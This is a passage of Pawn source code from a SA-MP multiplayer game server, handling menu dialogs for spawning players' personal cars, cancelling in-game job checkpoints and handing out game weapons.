                    new car = CreateVehicle(CarInfo[carid][cModel],CarInfo[carid][cLocationx],CarInfo[carid][cLocationy],CarInfo[carid][cLocationz],CarInfo[carid][cAngle],CarInfo[carid][cColorOne],CarInfo[carid][cColorTwo],500000);
			    	SetVehicleNumberPlate(car, CarInfo[carid][cLicense]);
					SetVehicleHealth(car, CarInfo[carid][cHP]);
					UpdateVehicleDamageStatus(car, CarInfo[carid][cDamage1], CarInfo[carid][cDamage2], CarInfo[carid][cDamage3], CarInfo[carid][cDamage4]);
					Gas[car] = CarInfo[carid][cGas];
					new engine,lights,alarm,doors,bonnet,boot,objective;
					if(CarInfo[carid][cLock] == 1)
					{
						GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
			    		SetVehicleParamsEx(car,engine,lights,alarm,1,bonnet,boot,objective);
					}
					if(CarInfo[carid][cLock] == 0)
					{
						GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
			    		SetVehicleParamsEx(car,engine,lights,alarm,0,bonnet,boot,objective);
					}
					OwnedVeh(car) = carid;
					personalcar[5][playerid] = car;
					SwitchKey[playerid] = 1;
					ModVehicle(car);
					DespawnCar[playerid][5] = 600;
				}
			}
			if(listitem == 6)
			{
				new stringg[456];
				new carid = PlayerInfo[playerid][pCarkey7];
				if(carid == 0) return 1;
				if(personalcar[6][playerid] != 0)
	   			{
		   			format(stringg, sizeof(stringg), "Manage your %s (%d)",CarInfo[carid][cDescription],CarInfo[carid][cID]);
					ShowPlayerDialog(playerid,DIALOG_VEHSPAWN7,DIALOG_STYLE_LIST,stringg,"{FFFFFF}Vehicle Info\nTow vehicle\nFind Vehicle\nBuy Insurance\nClear Age and KM - {FFFF00}20 premium points\nDespawn Car","Select","Close");
	   			}
	   			else
	   			{
					format(stringg, sizeof(stringg), "Manage your %s (%d)",CarInfo[carid][cDescription],CarInfo[carid][cID]);
					ShowPlayerDialog(playerid,DIALOG_VEHSPAWN7,DIALOG_STYLE_LIST,stringg,"{FFFFFF}Vehicle Info\nTow vehicle\nFind Vehicle\nBuy Insurance\nClear Age and KM - {FFFF00}20 premium points\nDespawn Car","Select","Close");
                    new car = CreateVehicle(CarInfo[carid][cModel],CarInfo[carid][cLocationx],CarInfo[carid][cLocationy],CarInfo[carid][cLocationz],CarInfo[carid][cAngle],CarInfo[carid][cColorOne],CarInfo[carid][cColorTwo],500000);
			    	SetVehicleNumberPlate(car, CarInfo[carid][cLicense]);
					SetVehicleHealth(car, CarInfo[carid][cHP]);
					UpdateVehicleDamageStatus(car, CarInfo[carid][cDamage1], CarInfo[carid][cDamage2], CarInfo[carid][cDamage3], CarInfo[carid][cDamage4]);
					Gas[car] = CarInfo[carid][cGas];
					new engine,lights,alarm,doors,bonnet,boot,objective;
					if(CarInfo[carid][cLock] == 1)
					{
						GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
			    		SetVehicleParamsEx(car,engine,lights,alarm,1,bonnet,boot,objective);
					}
					if(CarInfo[carid][cLock] == 0)
					{
						GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
			    		SetVehicleParamsEx(car,engine,lights,alarm,0,bonnet,boot,objective);
					}
					OwnedVeh(car) = carid;
					personalcar[6][playerid] = car;
					SwitchKey[playerid] = 1;
					ModVehicle(car);
					DespawnCar[playerid][6] = 600;
				}
			}
			if(listitem == 7)
			{
				new stringg[456];
				new carid = PlayerInfo[playerid][pCarkey8];
				if(carid == 0) return 1;
				if(personalcar[7][playerid] != 0)
	   			{
		   			format(stringg, sizeof(stringg), "Manage your %s (%d)",CarInfo[carid][cDescription],CarInfo[carid][cID]);
					ShowPlayerDialog(playerid,DIALOG_VEHSPAWN8,DIALOG_STYLE_LIST,stringg,"{FFFFFF}Vehicle Info\nTow vehicle\nFind Vehicle\nBuy Insurance\nClear Age and KM - {FFFF00}20 premium points\nDespawn Car","Select","Close");
	   			}
	   			else
	   			{
					format(stringg, sizeof(stringg), "Manage your %s (%d)",CarInfo[carid][cDescription],CarInfo[carid][cID]);
					ShowPlayerDialog(playerid,DIALOG_VEHSPAWN8,DIALOG_STYLE_LIST,stringg,"{FFFFFF}Vehicle Info\nTow vehicle\nFind Vehicle\nBuy Insurance\nClear Age and KM - {FFFF00}20 premium points\nDespawn Car","Select","Close");
                    new car = CreateVehicle(CarInfo[carid][cModel],CarInfo[carid][cLocationx],CarInfo[carid][cLocationy],CarInfo[carid][cLocationz],CarInfo[carid][cAngle],CarInfo[carid][cColorOne],CarInfo[carid][cColorTwo],500000);
			    	SetVehicleNumberPlate(car, CarInfo[carid][cLicense]);
					SetVehicleHealth(car, CarInfo[carid][cHP]);
					UpdateVehicleDamageStatus(car, CarInfo[carid][cDamage1], CarInfo[carid][cDamage2], CarInfo[carid][cDamage3], CarInfo[carid][cDamage4]);
					Gas[car] = CarInfo[carid][cGas];
					new engine,lights,alarm,doors,bonnet,boot,objective;
					if(CarInfo[carid][cLock] == 1)
					{
						GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
			    		SetVehicleParamsEx(car,engine,lights,alarm,1,bonnet,boot,objective);
					}
					if(CarInfo[carid][cLock] == 0)
					{
						GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
			    		SetVehicleParamsEx(car,engine,lights,alarm,0,bonnet,boot,objective);
					}
					OwnedVeh(car) = carid;
					personalcar[7][playerid] = car;
					SwitchKey[playerid] = 1;
					ModVehicle(car);
					DespawnCar[playerid][7] = 600;
				}
			}
			if(listitem == 8)
			{
				new stringg[456];
				new carid = PlayerInfo[playerid][pCarkey9];
				if(carid == 0) return 1;
				if(personalcar[8][playerid] != 0)
	   			{
		   			format(stringg, sizeof(stringg), "Manage your %s (%d)",CarInfo[carid][cDescription],CarInfo[carid][cID]);
					ShowPlayerDialog(playerid,DIALOG_VEHSPAWN9,DIALOG_STYLE_LIST,stringg,"{FFFFFF}Vehicle Info\nTow vehicle\nFind Vehicle\nBuy Insurance\nClear Age and KM - {FFFF00}20 premium points\nDespawn Car","Select","Close");
	   			}
	   			else
	   			{
					format(stringg, sizeof(stringg), "Manage your %s (%d)",CarInfo[carid][cDescription],CarInfo[carid][cID]);
					ShowPlayerDialog(playerid,DIALOG_VEHSPAWN9,DIALOG_STYLE_LIST,stringg,"{FFFFFF}Vehicle Info\nTow vehicle\nFind Vehicle\nBuy Insurance\nClear Age and KM - {FFFF00}20 premium points\nDespawn Car","Select","Close");
                    new car = CreateVehicle(CarInfo[carid][cModel],CarInfo[carid][cLocationx],CarInfo[carid][cLocationy],CarInfo[carid][cLocationz],CarInfo[carid][cAngle],CarInfo[carid][cColorOne],CarInfo[carid][cColorTwo],500000);
			    	SetVehicleNumberPlate(car, CarInfo[carid][cLicense]);
					SetVehicleHealth(car, CarInfo[carid][cHP]);
					UpdateVehicleDamageStatus(car, CarInfo[carid][cDamage1], CarInfo[carid][cDamage2], CarInfo[carid][cDamage3], CarInfo[carid][cDamage4]);
					Gas[car] = CarInfo[carid][cGas];
					new engine,lights,alarm,doors,bonnet,boot,objective;
					if(CarInfo[carid][cLock] == 1)
					{
						GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
			    		SetVehicleParamsEx(car,engine,lights,alarm,1,bonnet,boot,objective);
					}
					if(CarInfo[carid][cLock] == 0)
					{
						GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
			    		SetVehicleParamsEx(car,engine,lights,alarm,0,bonnet,boot,objective);
					}
					OwnedVeh(car) = carid;
					personalcar[8][playerid] = car;
					SwitchKey[playerid] = 1;
					ModVehicle(car);
					DespawnCar[playerid][8] = 600;
				}
			}
			if(listitem == 9)
			{
				new stringg[456];
				new carid = PlayerInfo[playerid][pCarkey10];
				if(carid == 0) return 1;
				if(personalcar[9][playerid] != 0)
	   			{
		   			format(stringg, sizeof(stringg), "Manage your %s (%d)",CarInfo[carid][cDescription],CarInfo[carid][cID]);
					ShowPlayerDialog(playerid,DIALOG_VEHSPAWN10,DIALOG_STYLE_LIST,stringg,"{FFFFFF}Vehicle Info\nTow vehicle\nFind Vehicle\nBuy Insurance\nClear Age and KM - {FFFF00}20 premium points\nDespawn Car","Select","Close");
	   			}
	   			else
	   			{
					format(stringg, sizeof(stringg), "Manage your %s (%d)",CarInfo[carid][cDescription],CarInfo[carid][cID]);
					ShowPlayerDialog(playerid,DIALOG_VEHSPAWN10,DIALOG_STYLE_LIST,stringg,"{FFFFFF}Vehicle Info\nTow vehicle\nFind Vehicle\nBuy Insurance\nClear Age and KM - {FFFF00}20 premium points\nDespawn Car","Select","Close");
                    new car = CreateVehicle(CarInfo[carid][cModel],CarInfo[carid][cLocationx],CarInfo[carid][cLocationy],CarInfo[carid][cLocationz],CarInfo[carid][cAngle],CarInfo[carid][cColorOne],CarInfo[carid][cColorTwo],500000);
			    	SetVehicleNumberPlate(car, CarInfo[carid][cLicense]);
					SetVehicleHealth(car, CarInfo[carid][cHP]);
					UpdateVehicleDamageStatus(car, CarInfo[carid][cDamage1], CarInfo[carid][cDamage2], CarInfo[carid][cDamage3], CarInfo[carid][cDamage4]);
					Gas[car] = CarInfo[carid][cGas];
					new engine,lights,alarm,doors,bonnet,boot,objective;
					if(CarInfo[carid][cLock] == 1)
					{
						GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
			    		SetVehicleParamsEx(car,engine,lights,alarm,1,bonnet,boot,objective);
					}
					if(CarInfo[carid][cLock] == 0)
					{
						GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
			    		SetVehicleParamsEx(car,engine,lights,alarm,0,bonnet,boot,objective);
					}
					OwnedVeh(car) = carid;
					personalcar[9][playerid] = car;
					SwitchKey[playerid] = 1;
					ModVehicle(car);
					DespawnCar[playerid][9] = 600;
				}
			}
			if(listitem == 10)
			{
				new stringg[456];
				new carid = PlayerInfo[playerid][pCarkey11];
				if(carid == 0) return 1;
				if(personalcar[10][playerid] != 0)
	   			{
		   			format(stringg, sizeof(stringg), "Manage your %s (%d)",CarInfo[carid][cDescription],CarInfo[carid][cID]);
					ShowPlayerDialog(playerid,DIALOG_VEHSPAWN11,DIALOG_STYLE_LIST,stringg,"{FFFFFF}Vehicle Info\nTow vehicle\nFind Vehicle\nBuy Insurance\nClear Age and KM - {FFFF00}20 premium points\nDespawn Car","Select","Close");
	   			}
	   			else
	   			{
					format(stringg, sizeof(stringg), "Manage your %s (%d)",CarInfo[carid][cDescription],CarInfo[carid][cID]);
					ShowPlayerDialog(playerid,DIALOG_VEHSPAWN11,DIALOG_STYLE_LIST,stringg,"{FFFFFF}Vehicle Info\nTow vehicle\nFind Vehicle\nBuy Insurance\nClear Age and KM - {FFFF00}20 premium points\nDespawn Car","Select","Close");
                    new car = CreateVehicle(CarInfo[carid][cModel],CarInfo[carid][cLocationx],CarInfo[carid][cLocationy],CarInfo[carid][cLocationz],CarInfo[carid][cAngle],CarInfo[carid][cColorOne],CarInfo[carid][cColorTwo],500000);
			    	SetVehicleNumberPlate(car, CarInfo[carid][cLicense]);
					SetVehicleHealth(car, CarInfo[carid][cHP]);
					UpdateVehicleDamageStatus(car, CarInfo[carid][cDamage1], CarInfo[carid][cDamage2], CarInfo[carid][cDamage3], CarInfo[carid][cDamage4]);
					Gas[car] = CarInfo[carid][cGas];
					new engine,lights,alarm,doors,bonnet,boot,objective;
					if(CarInfo[carid][cLock] == 1)
					{
						GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
			    		SetVehicleParamsEx(car,engine,lights,alarm,1,bonnet,boot,objective);
					}
					if(CarInfo[carid][cLock] == 0)
					{
						GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
			    		SetVehicleParamsEx(car,engine,lights,alarm,0,bonnet,boot,objective);
					}
					OwnedVeh(car) = carid;
					personalcar[10][playerid] = car;
					SwitchKey[playerid] = 1;
					ModVehicle(car);
					DespawnCar[playerid][10] = 600;
				}
			}
			if(listitem == 11)
			{
				new stringg[456];
				new carid = PlayerInfo[playerid][pCarkey12];
				if(carid == 0) return 1;
				if(personalcar[11][playerid] != 0)
	   			{
		   			format(stringg, sizeof(stringg), "Manage your %s (%d)",CarInfo[carid][cDescription],CarInfo[carid][cID]);
					ShowPlayerDialog(playerid,DIALOG_VEHSPAWN12,DIALOG_STYLE_LIST,stringg,"{FFFFFF}Vehicle Info\nTow vehicle\nFind Vehicle\nBuy Insurance\nClear Age and KM - {FFFF00}20 premium points\nDespawn Car","Select","Close");
	   			}
	   			else
	   			{
					format(stringg, sizeof(stringg), "Manage your %s (%d)",CarInfo[carid][cDescription],CarInfo[carid][cID]);
					ShowPlayerDialog(playerid,DIALOG_VEHSPAWN12,DIALOG_STYLE_LIST,stringg,"{FFFFFF}Vehicle Info\nTow vehicle\nFind Vehicle\nBuy Insurance\nClear Age and KM - {FFFF00}20 premium points\nDespawn Car","Select","Close");
                    new car = CreateVehicle(CarInfo[carid][cModel],CarInfo[carid][cLocationx],CarInfo[carid][cLocationy],CarInfo[carid][cLocationz],CarInfo[carid][cAngle],CarInfo[carid][cColorOne],CarInfo[carid][cColorTwo],500000);
			    	SetVehicleNumberPlate(car, CarInfo[carid][cLicense]);
					SetVehicleHealth(car, CarInfo[carid][cHP]);
					UpdateVehicleDamageStatus(car, CarInfo[carid][cDamage1], CarInfo[carid][cDamage2], CarInfo[carid][cDamage3], CarInfo[carid][cDamage4]);
					Gas[car] = CarInfo[carid][cGas];
					new engine,lights,alarm,doors,bonnet,boot,objective;
					if(CarInfo[carid][cLock] == 1)
					{
						GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
			    		SetVehicleParamsEx(car,engine,lights,alarm,1,bonnet,boot,objective);
					}
					if(CarInfo[carid][cLock] == 0)
					{
						GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
			    		SetVehicleParamsEx(car,engine,lights,alarm,0,bonnet,boot,objective);
					}
					OwnedVeh(car) = carid;
					personalcar[11][playerid] = car;
					SwitchKey[playerid] = 1;
					ModVehicle(car);
					DespawnCar[playerid][11] = 600;
				}
			}
			if(listitem == 12)
			{
				new stringg[456];
				new carid = PlayerInfo[playerid][pCarkey13];
				if(carid == 0) return 1;
				if(personalcar[12][playerid] != 0)
	   			{
		   			format(stringg, sizeof(stringg), "Manage your %s (%d)",CarInfo[carid][cDescription],CarInfo[carid][cID]);
					ShowPlayerDialog(playerid,DIALOG_VEHSPAWN13,DIALOG_STYLE_LIST,stringg,"{FFFFFF}Vehicle Info\nTow vehicle\nFind Vehicle\nBuy Insurance\nClear Age and KM - {FFFF00}20 premium points\nDespawn Car","Select","Close");
	   			}
	   			else
	   			{
					format(stringg, sizeof(stringg), "Manage your %s (%d)",CarInfo[carid][cDescription],CarInfo[carid][cID]);
					ShowPlayerDialog(playerid,DIALOG_VEHSPAWN13,DIALOG_STYLE_LIST,stringg,"{FFFFFF}Vehicle Info\nTow vehicle\nFind Vehicle\nBuy Insurance\nClear Age and KM - {FFFF00}20 premium points\nDespawn Car","Select","Close");
                    new car = CreateVehicle(CarInfo[carid][cModel],CarInfo[carid][cLocationx],CarInfo[carid][cLocationy],CarInfo[carid][cLocationz],CarInfo[carid][cAngle],CarInfo[carid][cColorOne],CarInfo[carid][cColorTwo],500000);
			    	SetVehicleNumberPlate(car, CarInfo[carid][cLicense]);
					SetVehicleHealth(car, CarInfo[carid][cHP]);
					UpdateVehicleDamageStatus(car, CarInfo[carid][cDamage1], CarInfo[carid][cDamage2], CarInfo[carid][cDamage3], CarInfo[carid][cDamage4]);
					Gas[car] = CarInfo[carid][cGas];
					new engine,lights,alarm,doors,bonnet,boot,objective;
					if(CarInfo[carid][cLock] == 1)
					{
						GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
			    		SetVehicleParamsEx(car,engine,lights,alarm,1,bonnet,boot,objective);
					}
					if(CarInfo[carid][cLock] == 0)
					{
						GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
			    		SetVehicleParamsEx(car,engine,lights,alarm,0,bonnet,boot,objective);
					}
					OwnedVeh(car) = carid;
					personalcar[12][playerid] = car;
					SwitchKey[playerid] = 1;
					ModVehicle(car);
					DespawnCar[playerid][12] = 600;
				}
			}
			if(listitem == 13)
			{
				new stringg[456];
				new carid = PlayerInfo[playerid][pCarkey14];
				if(carid == 0) return 1;
				if(personalcar[13][playerid] != 0)
	   			{
		   			format(stringg, sizeof(stringg), "Manage your %s (%d)",CarInfo[carid][cDescription],CarInfo[carid][cID]);
					ShowPlayerDialog(playerid,DIALOG_VEHSPAWN14,DIALOG_STYLE_LIST,stringg,"{FFFFFF}Vehicle Info\nTow vehicle\nFind Vehicle\nBuy Insurance\nClear Age and KM - {FFFF00}20 premium points\nDespawn Car","Select","Close");
	   			}
	   			else
	   			{
					format(stringg, sizeof(stringg), "Manage your %s (%d)",CarInfo[carid][cDescription],CarInfo[carid][cID]);
					ShowPlayerDialog(playerid,DIALOG_VEHSPAWN14,DIALOG_STYLE_LIST,stringg,"{FFFFFF}Vehicle Info\nTow vehicle\nFind Vehicle\nBuy Insurance\nClear Age and KM - {FFFF00}20 premium points\nDespawn Car","Select","Close");
                    new car = CreateVehicle(CarInfo[carid][cModel],CarInfo[carid][cLocationx],CarInfo[carid][cLocationy],CarInfo[carid][cLocationz],CarInfo[carid][cAngle],CarInfo[carid][cColorOne],CarInfo[carid][cColorTwo],500000);
			    	SetVehicleNumberPlate(car, CarInfo[carid][cLicense]);
					SetVehicleHealth(car, CarInfo[carid][cHP]);
					UpdateVehicleDamageStatus(car, CarInfo[carid][cDamage1], CarInfo[carid][cDamage2], CarInfo[carid][cDamage3], CarInfo[carid][cDamage4]);
					Gas[car] = CarInfo[carid][cGas];
					new engine,lights,alarm,doors,bonnet,boot,objective;
					if(CarInfo[carid][cLock] == 1)
					{
						GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
			    		SetVehicleParamsEx(car,engine,lights,alarm,1,bonnet,boot,objective);
					}
					if(CarInfo[carid][cLock] == 0)
					{
						GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
			    		SetVehicleParamsEx(car,engine,lights,alarm,0,bonnet,boot,objective);
					}
					OwnedVeh(car) = carid;
					personalcar[13][playerid] = car;
					SwitchKey[playerid] = 1;
					ModVehicle(car);
					DespawnCar[playerid][13] = 600;
				}
			}
			if(listitem == 14)
			{
				new stringg[456];
				new carid = PlayerInfo[playerid][pCarkey15];
				if(carid == 0) return 1;
				if(personalcar[14][playerid] != 0)
	   			{
		   			format(stringg, sizeof(stringg), "Manage your %s (%d)",CarInfo[carid][cDescription],CarInfo[carid][cID]);
					ShowPlayerDialog(playerid,DIALOG_VEHSPAWN15,DIALOG_STYLE_LIST,stringg,"{FFFFFF}Vehicle Info\nTow vehicle\nFind Vehicle\nBuy Insurance\nClear Age and KM - {FFFF00}20 premium points\nDespawn Car","Select","Close");
	   			}
	   			else
	   			{
					format(stringg, sizeof(stringg), "Manage your %s (%d)",CarInfo[carid][cDescription],CarInfo[carid][cID]);
					ShowPlayerDialog(playerid,DIALOG_VEHSPAWN15,DIALOG_STYLE_LIST,stringg,"{FFFFFF}Vehicle Info\nTow vehicle\nFind Vehicle\nBuy Insurance\nClear Age and KM - {FFFF00}20 premium points\nDespawn Car","Select","Close");
                    new car = CreateVehicle(CarInfo[carid][cModel],CarInfo[carid][cLocationx],CarInfo[carid][cLocationy],CarInfo[carid][cLocationz],CarInfo[carid][cAngle],CarInfo[carid][cColorOne],CarInfo[carid][cColorTwo],500000);
			    	SetVehicleNumberPlate(car, CarInfo[carid][cLicense]);
					SetVehicleHealth(car, CarInfo[carid][cHP]);
					UpdateVehicleDamageStatus(car, CarInfo[carid][cDamage1], CarInfo[carid][cDamage2], CarInfo[carid][cDamage3], CarInfo[carid][cDamage4]);
					Gas[car] = CarInfo[carid][cGas];
					new engine,lights,alarm,doors,bonnet,boot,objective;
					if(CarInfo[carid][cLock] == 1)
					{
						GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
			    		SetVehicleParamsEx(car,engine,lights,alarm,1,bonnet,boot,objective);
					}
					if(CarInfo[carid][cLock] == 0)
					{
						GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
			    		SetVehicleParamsEx(car,engine,lights,alarm,0,bonnet,boot,objective);
					}
					OwnedVeh(car) = carid;
					personalcar[14][playerid] = car;
					SwitchKey[playerid] = 1;
					ModVehicle(car);
					DespawnCar[playerid][14] = 600;
				}
			}
		}
	    return 1;
	}
	if(dialogid == DIALOG_JOBULETES)
	{
	    if(response)
	    {
	        UsedFind[playerid] = 0;
			DisablePlayerCheckpoint(playerid);
			foreach(Player, i)
			{
				if(IsACop(playerid))
				{
					if(caser[playerid] == i)
					{
						cased[i] --;
						caser[playerid] = 1001;
					}
				}

			}
			if(JCurier[playerid][0] > 0)
			{
				if(JCurier[playerid][1] > 0)
				{
					DisableRemoteVehicleCollisions(playerid, 0);
				}
				DestroyVehicle(JCurier[playerid][2]);
				JCurier[playerid][0] = -1;
				JCurier[playerid][1] = -1;
				JCurier[playerid][2] = -1;
				JCurier[playerid][3] = 0;
				SCM(playerid, COLOR_ERROR, "Job failed! You have disabled Checkpoint.");
				DisablePlayerCheckpoint(playerid);
			}
			if(JCiment[playerid][0] > 0)
			{
				if(JCiment[playerid][1] > 0)
				{
					DisableRemoteVehicleCollisions(playerid, 0);
				}
				DestroyVehicle(JCiment[playerid][2]);
				JCiment[playerid][0] = -1;
				JCiment[playerid][1] = -1;
				JCiment[playerid][2] = -1;
				SCM(playerid, COLOR_ERROR, "Job failed! You have disabled Checkpoint.");
				DisablePlayerCheckpoint(playerid);
			}
			if(JCariera[playerid][0] > 0)
			{
				if(JCariera[playerid][1] > 0)
				{
					DisableRemoteVehicleCollisions(playerid, 0);
				}
				DestroyVehicle(JCariera[playerid][2]);
				JCariera[playerid][0] = -1;
				JCariera[playerid][1] = -1;
				JCariera[playerid][2] = -1;
				SCM(playerid, COLOR_ERROR, "job failed!.");
				DisablePlayerCheckpoint(playerid);
				for(new t = 0; t < 26; t++)
				{
					if( IsValidDynamicObject( CarieraObiect[playerid][t] ) )
					{
						DestroyDynamicObject(CarieraObiect[playerid][t]);
					}
				}
			}
			if(workdeja[playerid] == 1)
			{
			    DisablePlayerCheckpoint(playerid);
				SCM(playerid,COLOR_ERROR,"Checkpoint canceled!");
				workdeja[playerid] = 0;
				DestroyVehicle(pizzacar[playerid]);
			    DisablePlayerRaceCheckpoint(playerid);
				pizzaj[playerid] = 0;
				pizzatime[playerid] = 0;
				failpizza[playerid] = -1;
				PizzaCP[playerid] = 0;
				pizzaprize[playerid] = 0;
				pizzacar[playerid] = -1;
			}
			DisablePlayerCheckpoint(playerid);
 			DisablePlayerRaceCheckpoint(playerid);
			SCM(playerid,COLOR_ERROR,"Checkpoint canceled!");
			CP[playerid] = 0;
			if(GotoMats[playerid] > 0)
			{
			    DisablePlayerCheckpoint(playerid);
			    GotoMats[playerid] = 0;
			}
			if(IsATruck(GetPlayerVehicleID(playerid)))
			{
			    RemovePlayerFromVehicle(playerid);
	    		restruck[playerid] = SetTimerEx("RespawnTruck", 1, 0, "i",playerid);
			}

    		if(TakingLesson[playerid] == 1)
    		{
        		PlayerTextDrawHide(playerid, DMVexam[playerid]);
        		PlayerTextDrawHide(playerid, DMVcheck[playerid]);
				DestroyVehicle(examcar[playerid]);
				DisableRemoteVehicleCollisions(playerid, 0);
				examcar[playerid] = -1;
        		TakingLesson[playerid] = 0;
	    		DisablePlayerRaceCheckpoint(playerid);
    		}
			if(IsCollectingRubbish[playerid] > 0)
			{
				DisablePlayerCheckpoint(playerid);
				PlayerInfo[playerid][pGarbageTime] = 0;
		    	IsCollectingRubbish[playerid] = 0;
		    	PlayerTextDrawHide(playerid, gunoierr[playerid]);
			}
			if(farmerc[playerid] == 1)
			{
				farmerc[playerid] = 0;
				farmertime[playerid] = 1;
				PlayerTextDrawHide(playerid, farmjob[playerid]);
				PlayerTextDrawHide(playerid, farmbox[playerid]);
				PlayerTextDrawHide(playerid, farmtime[playerid]);
				PlayerTextDrawHide(playerid, farmspeed[playerid]);
				PlayerTextDrawHide(playerid, farmwanted[playerid]);
				KillTimer(timerfarmm[playerid]);
			}
			if(CarJacker[playerid] > 0)
			{
		    	DisablePlayerCheckpoint(playerid);
		    	CarJacker[playerid] = 0;
		    	JackAcc[playerid] = 0;
			}
			if(Trucker[playerid] >= 1)
			{
			    RemovePlayerFromVehicle(playerid);
		   		Trucker[playerid] = 0;
	        	Trucker2[playerid] = 0;
	        	DestroyVehicle(viddd[playerid]);
	        	viddd[playerid] = 0;
	        	SetVehicleToRespawn(TruckID[playerid]);
	        	TruckID[playerid] = 0;
	        	DisablePlayerCheckpoint(playerid);
	    		restruck[playerid] = SetTimerEx("RespawnTruck", 1, 0, "i",playerid);
			}
			if(busc[playerid] == 1)
			{
		    	busc[playerid] = 0;
		    	PlayerTextDrawHide(playerid, BusJob[playerid]);
		    	PlayerTextDrawHide(playerid, BusCheck[playerid]);
		    	KillTimer(timerbus[playerid]);
		    	DisablePlayerRaceCheckpoint(playerid);
		    	if(JobStep[playerid] >= 1)
		    	{
      				JobStep[playerid] = 0;
	    			GivePlayerCash(playerid, -2500);
		    		SendClientMessage(playerid, COLOR_GREEN, "(-) You paid $2.500 the company buses duty.");
				}
			}
			if(MatsHolding[playerid] > 0)
			{
			    MatsHolding[playerid] = 0;
			    DisablePlayerCheckpoint(playerid);
			    DisablePlayerRaceCheckpoint(playerid);
			    CP[playerid] = 0;
			}
			if(CheckBus[playerid] > 0)
			{
			    busc[playerid] = 0;
				CheckBus[playerid] = 0;
			}
			if(CP[playerid] == 34)
			{
			    new towedcar = GetVehicleTrailer(GetPlayerVehicleID(playerid));
				SetVehicleToRespawn(towedcar);
				CP[playerid] = 0;
			}
			if(MechanicCallTime[playerid] > 0)
			{
			    MechanicCallTime[playerid] = 0;
			}
			if(TaxiCallTime[playerid] > 0 && TaxiAccepted[playerid] < 999)
			{
	    		TaxiAccepted[playerid] = 999;
				TaxiCallTime[playerid] = 0;
				DisablePlayerCheckpoint(playerid);
			}
			if(CP[playerid] == 340 || CP[playerid] == 341 || CP[playerid] == 342 || CP[playerid] == 343 || CP[playerid] == 344 || CP[playerid] == 345 || CP[playerid] == 346 || CP[playerid] == 347)
			{
 				DisablePlayerCheckpoint(playerid);
				CP[playerid] = 0;
			}

		}
		return 1;
	}
	if(dialogid == Dialog_getweaponsarea)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
	            GivePlayerWeaponEx(playerid, 35, 300);
	            SCM(playerid, -1, "You get RPG.");
	        }
	        if(listitem == 1)
	        {
	            GivePlayerWeaponEx(playerid, 38, 300);
	            SCM(playerid, -1, "You get MiniGun.");
	        }
			if(listitem == 2)
			{
			    GivePlayerWeaponEx(playerid, 24, 300);
	            SCM(playerid, -1, "You get Desert Eagle.");
			}
			if(listitem == 3)
			{
			    GivePlayerWeaponEx(playerid, 36, 300);
	            SCM(playerid, -1, "You get Rocket Luncher.");
			}
			if(listitem == 4)
			{
			    GivePlayerWeaponEx(playerid, 29, 300);
	            SCM(playerid, -1, "You get MP5.");
			}
			if(listitem == 5)
			{
			    GivePlayerWeaponEx(playerid, 30, 300);
	            SCM(playerid, -1, "You get AK-47.");
			}
			if(listitem == 6)
			{
			    GivePlayerWeaponEx(playerid, 31, 300);
	            SCM(playerid, -1, "You get M4.");
			}
			if(listitem == 7)
			{
			    GivePlayerWeaponEx(playerid, 32, 300);
	            SCM(playerid, -1, "You get Tec 9.");
			}
			if(listitem == 8)
			{
			    GivePlayerWeaponEx(playerid, 27, 300);
	            SCM(playerid, -1, "You get Combat Shotgun.");
			}
			if(listitem == 9)
			{
			    GivePlayerWeaponEx(playerid, 16, 300);
	            SCM(playerid, -1, "You get Grenade.");
			}
			if(listitem == 10)
			{
			    SetPlayerArmourEx(playerid, 100);
	            SCM(playerid, -1, "You get Armour(100).");
			}
	    }
	}
	if(dialogid == DIALOG_VEHSPAWN1)
	{
	    if(response)
	    {
	    	if(listitem == 0)
			{
			    new carid = PlayerInfo[playerid][pPcarkey],stringgg[256],speed;
			    speed = MySQLCheckSpeed(CarInfo[carid][cModel]);
			    format(stringgg,sizeof(stringgg),"Vehicle Model: %d\nDistance Traveled: %.0f KM\nVehicle Age: %d days\nInsurance Price: $%s\nInsurance Points: %d\nTop speed with engine upgrades: %d km/h",CarInfo[carid][cModel],CarInfo[carid][cKM],CarInfo[carid][cDays],FormatNumber(CarInfo[carid][cInscarprice]),CarInfo[carid][cInsurancecar],speed);
				ShowPlayerDialog(playerid,DIALOG_VEHINFO,DIALOG_STYLE_MSGBOX,"Vehicle Info",stringgg,"Close","");
				return 1;
			}
			if(listitem == 1)
			{
				new car = personalcar[0][playerid],car2 = PlayerInfo[playerid][pPcarkey];
				if(IsTrailerAttachedToVehicle(car)) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}On a mission right now, can't use this command.");
				TowCar(car,car2,playerid);
			}
			if(listitem == 2)
			{
			    if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid))) return SendClientMessage(playerid, COLOR_SERVER, "{FFF8C6}On a mission right now, can't use this command.");
				if(BusinessRob[playerid] > 0) return SendClientMessage(playerid,COLOR_SERVER,"You can't use this while robbing the bank.");
			    if(CP[playerid] < 1 && IsCollectingRubbish[playerid] < 1 && !IsATruck(GetPlayerVehicleID(playerid)) && MechanicCallTime[playerid] < 1 && CheckBus[playerid] < 1 && GotoMats[playerid] < 1)
				{
